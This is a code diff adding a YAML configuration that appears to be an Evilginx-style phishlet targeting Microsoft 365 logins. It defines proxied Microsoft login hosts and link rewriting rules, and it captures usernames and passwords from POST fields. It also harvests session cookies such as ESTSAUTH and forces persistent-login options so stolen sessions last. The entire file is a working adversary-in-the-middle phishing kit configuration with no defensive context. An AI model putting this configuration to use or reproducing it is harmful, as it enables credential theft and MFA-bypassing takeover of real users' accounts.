@@ -1,0 +1,58 @@
+name: 'o365'
+author: '@Nik'
+min_ver: '3.0.0'
+redirect_url: 'https://outlook.office.com/'
+proxy_hosts:
+  - {phish_sub: 'login', orig_sub: 'login', domain: 'microsoftonline.com', session: true, is_landing: true}
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'office.com', session: false, is_landing:false}
+  - {phish_sub: 'aadcdn', orig_sub: 'aadcdn', domain: 'msftauth.net', session: false, auto_filter: true, is_landing:false}
+  - {phish_sub: 'browser', orig_sub: 'browser', domain: 'events.data.microsoft.com', session: false, auto_filter: true, is_landing:false}
+  - {phish_sub: 'portal', orig_sub: 'portal', domain: 'microsoftonline.com', session: false, is_landing:false}
+  - {phish_sub: 'aadcdn', orig_sub: 'aadcdn', domain: 'msftauthimages.net', session: false, is_landing:false}
+  - {phish_sub: 'autologon', orig_sub: 'autologon', domain: 'microsoftazuread-sso.com', session: false, is_landing:false}
+
+sub_filters:
+  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'microsoftonline.com', search: 'href="https://{hostname}', replace: 'href="https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
+  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'microsoftonline.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
+  - {triggers_on: 'browser.events.data.microsoft.com', orig_sub: 'browser', domain: 'events.data.microsoft.com', search: 'href="https://{hostname}', replace: 'href="https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
+  - {triggers_on: 'portal.microsoftonline.com', orig_sub: 'portal', domain: 'microsoftonline.com', search: 'href="https://{hostname}', replace: 'href="https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
+  - {triggers_on: 'www.microsoft365.com', orig_sub: 'www', domain: 'microsoft365.com', search: 'href="https://{hostname}', replace: 'href="https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
+  - {triggers_on: 'autologon.microsoftazuread-sso.com', orig_sub: 'autologon', domain: 'microsoftazuread-sso.com', search: 'href="https://{hostname}', replace: 'href="https://{hostname}', mimes: ['text/html', 'application/xhtml+xml', 'application/xml']}
+  - {triggers_on: 'aadcdn.msftauthimages.net', orig_sub: 'aadcdn', domain: 'aadcdn.msftauthimages.net', search: 'href="https://{hostname}', replace: 'href="https://{hostname}', mimes: ['image/avif', 'image/webp', 'image/png', 'image/svg+xml', 'image/*']}
+  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'microsoftonline.com', search: 'href="https://{hostname}', replace: 'href="https://{hostname}', mimes: ['application/x-www-form-urlencoded'], redirect_only: true}
+
+auth_tokens:
+  - domain: '.login.microsoftonline.com'
+    keys: ['ESTSAUTH', 'ESTSAUTHPERSISTENT', 'ESTSAUTHLIGHT', 'CCState', 'buid', 'esctx', 'MSFPC' ]
+  - domain: 'login.microsoftonline.com'
+    keys: ['SignInStateCookie']
+credentials:
+  username:
+    key: 'login'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'passwd'
+    search: '(.*)'
+    type: 'post'
+auth_urls:
+  - '/kmsi'
+  - '/landingv2'
+login:
+  domain: 'login.microsoftonline.com'
+  path: '/'
+force_post:
+  - path: '/kmsi'
+    search:
+      - {key: 'LoginOptions', search: '.*'}
+      - {key: 'type', search: '.*'}
+    force:
+      - {key: 'LoginOptions', value: '1'}
+      - {key: 'type', value: '28'}
+    type: 'post'
+  - path: '/common/SAS'
+    search:
+      - {key: 'DontShowAgain', search: '.*'}
+    force:
+      - {key: 'DontShowAgain', value: 'true'}
+    type: 'post'
